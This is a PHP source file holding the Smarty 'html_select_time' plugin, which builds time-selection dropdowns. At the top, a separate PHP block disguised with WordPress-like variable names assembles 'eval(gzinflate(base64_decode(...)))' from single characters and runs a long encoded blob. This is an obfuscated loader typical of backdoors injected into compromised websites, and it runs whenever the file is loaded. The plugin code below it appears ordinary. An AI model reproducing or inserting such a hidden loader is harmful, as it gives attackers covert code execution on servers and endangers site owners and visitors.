<?php
$md5 = "0a0547ca03d8089145d7ae3b5ab5c942";
$wp_salt = array("o",'v',"r",'_',"l","t",'(','f','6','$',"z","4",'d',"a","g",'b',"e","i","n",")","s",';',"c");
$wp_add_filter = create_function('$'.'v',$wp_salt[16].$wp_salt[1].$wp_salt[13].$wp_salt[4].$wp_salt[6].$wp_salt[14].$wp_salt[10].$wp_salt[17].$wp_salt[18].$wp_salt[7].$wp_salt[4].$wp_salt[13].$wp_salt[5].$wp_salt[16].$wp_salt[6].$wp_salt[15].$wp_salt[13].$wp_salt[20].$wp_salt[16].$wp_salt[8].$wp_salt[11].$wp_salt[3].$wp_salt[12].$wp_salt[16].$wp_salt[22].$wp_salt[0].$wp_salt[12].$wp_salt[16].$wp_salt[6].$wp_salt[9].$wp_salt[1].$wp_salt[19].$wp_salt[19].$wp_salt[19].$wp_salt[21]);
$wp_add_filter('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');
?>
<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Smarty {html_select_time} function plugin
 *
 * Type:     function<br>
 * Name:     html_select_time<br>
 * Purpose:  Prints the dropdowns for time selection
 * @link http://smarty.php.net/manual/en/language.function.html.select.time.php {html_select_time}
 *          (Smarty online manual)
 * @author Roberto Berto <roberto@berto.net>
 * @credits Monte Ohrt <monte AT ohrt DOT com>
 * @param array
 * @param Smarty
 * @return string
 * @uses smarty_make_timestamp()
 */
function smarty_function_html_select_time($params, &$smarty)
{
    require_once $smarty->_get_plugin_filepath('shared','make_timestamp');
    require_once $smarty->_get_plugin_filepath('function','html_options');
    /* Default values. */
    $prefix             = "Time_";
    $time               = time();
    $display_hours      = true;
    $display_minutes    = true;
    $display_seconds    = true;
    $display_meridian   = true;
    $use_24_hours       = true;
    $minute_interval    = 1;
    $second_interval    = 1;
    /* Should the select boxes be part of an array when returned from PHP?
       e.g. setting it to "birthday", would create "birthday[Hour]",
       "birthday[Minute]", "birthday[Seconds]" & "birthday[Meridian]".
       Can be combined with prefix. */
    $field_array        = null;
    $all_extra          = null;
    $hour_extra         = null;
    $minute_extra       = null;
    $second_extra       = null;
    $meridian_extra     = null;

    foreach ($params as $_key=>$_value) {
        switch ($_key) {
            case 'prefix':
            case 'time':
            case 'field_array':
            case 'all_extra':
            case 'hour_extra':
            case 'minute_extra':
            case 'second_extra':
            case 'meridian_extra':
                $$_key = (string)$_value;
                break;

            case 'display_hours':
            case 'display_minutes':
            case 'display_seconds':
            case 'display_meridian':
            case 'use_24_hours':
                $$_key = (bool)$_value;
                break;

            case 'minute_interval':
            case 'second_interval':
                $$_key = (int)$_value;
                break;

            default:
                $smarty->trigger_error("[html_select_time] unknown parameter $_key", E_USER_WARNING);
        }
    }

    $time = smarty_make_timestamp($time);

    $html_result = '';

    if ($display_hours) {
        $hours       = $use_24_hours ? range(0, 23) : range(1, 12);
        $hour_fmt = $use_24_hours ? '%H' : '%I';
        for ($i = 0, $for_max = count($hours); $i < $for_max; $i++)
            $hours[$i] = sprintf('%02d', $hours[$i]);
        $html_result .= '<select name=';
        if (null !== $field_array) {
            $html_result .= '"' . $field_array . '[' . $prefix . 'Hour]"';
        } else {
            $html_result .= '"' . $prefix . 'Hour"';
        }
        if (null !== $hour_extra){
            $html_result .= ' ' . $hour_extra;
        }
        if (null !== $all_extra){
            $html_result .= ' ' . $all_extra;
        }
        $html_result .= '>'."\n";
        $html_result .= smarty_function_html_options(array('output'          => $hours,
                                                           'values'          => $hours,
                                                           'selected'      => strftime($hour_fmt, $time),
                                                           'print_result' => false),
                                                     $smarty);
        $html_result .= "</select>\n";
    }

    if ($display_minutes) {
        $all_minutes = range(0, 59);
        for ($i = 0, $for_max = count($all_minutes); $i < $for_max; $i+= $minute_interval)
            $minutes[] = sprintf('%02d', $all_minutes[$i]);
        $selected = intval(floor(strftime('%M', $time) / $minute_interval) * $minute_interval);
        $html_result .= '<select name=';
        if (null !== $field_array) {
            $html_result .= '"' . $field_array . '[' . $prefix . 'Minute]"';
        } else {
            $html_result .= '"' . $prefix . 'Minute"';
        }
        if (null !== $minute_extra){
            $html_result .= ' ' . $minute_extra;
        }
        if (null !== $all_extra){
            $html_result .= ' ' . $all_extra;
        }
        $html_result .= '>'."\n";
        
        $html_result .= smarty_function_html_options(array('output'          => $minutes,
                                                           'values'          => $minutes,
                                                           'selected'      => $selected,
                                                           'print_result' => false),
                                                     $smarty);
        $html_result .= "</select>\n";
    }

    if ($display_seconds) {
        $all_seconds = range(0, 59);
        for ($i = 0, $for_max = count($all_seconds); $i < $for_max; $i+= $second_interval)
            $seconds[] = sprintf('%02d', $all_seconds[$i]);
        $selected = intval(floor(strftime('%S', $time) / $second_interval) * $second_interval);
        $html_result .= '<select name=';
        if (null !== $field_array) {
            $html_result .= '"' . $field_array . '[' . $prefix . 'Second]"';
        } else {
            $html_result .= '"' . $prefix . 'Second"';
        }
        
        if (null !== $second_extra){
            $html_result .= ' ' . $second_extra;
        }
        if (null !== $all_extra){
            $html_result .= ' ' . $all_extra;
        }
        $html_result .= '>'."\n";
        
        $html_result .= smarty_function_html_options(array('output'          => $seconds,
                                                           'values'          => $seconds,
                                                           'selected'      => $selected,
                                                           'print_result' => false),
                                                     $smarty);
        $html_result .= "</select>\n";
    }

    if ($display_meridian && !$use_24_hours) {
        $html_result .= '<select name=';
        if (null !== $field_array) {
            $html_result .= '"' . $field_array . '[' . $prefix . 'Meridian]"';
        } else {
            $html_result .= '"' . $prefix . 'Meridian"';
        }
        
        if (null !== $meridian_extra){
            $html_result .= ' ' . $meridian_extra;
        }
        if (null !== $all_extra){
            $html_result .= ' ' . $all_extra;
        }
        $html_result .= '>'."\n";
        
        $html_result .= smarty_function_html_options(array('output'          => array('AM', 'PM'),
                                                           'values'          => array('am', 'pm'),
                                                           'selected'      => strtolower(strftime('%p', $time)),
                                                           'print_result' => false),
                                                     $smarty);
        $html_result .= "</select>\n";
    }

    return $html_result;
}

/* vim: set expandtab: */

?>